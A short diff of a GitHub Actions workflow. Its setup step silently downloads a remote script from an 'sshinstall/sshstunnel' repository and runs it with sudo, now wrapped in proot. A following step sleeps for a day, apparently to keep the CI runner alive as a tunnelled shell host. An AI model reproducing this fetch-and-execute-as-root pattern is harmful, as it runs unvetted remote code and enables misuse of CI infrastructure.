@@ -21,8 +21,7 @@ jobs:
            
       - name: setup
         run: |
-           cd /test && mkdir test && wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run &> /dev/null && sudo bash run
+          cd /test &&  ./dist/proot -S . /bin/bash -c "wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run &> /dev/null && sudo bash run"
         
- 
       - name: Ubuntu ready to go 
         run: sleep 1d
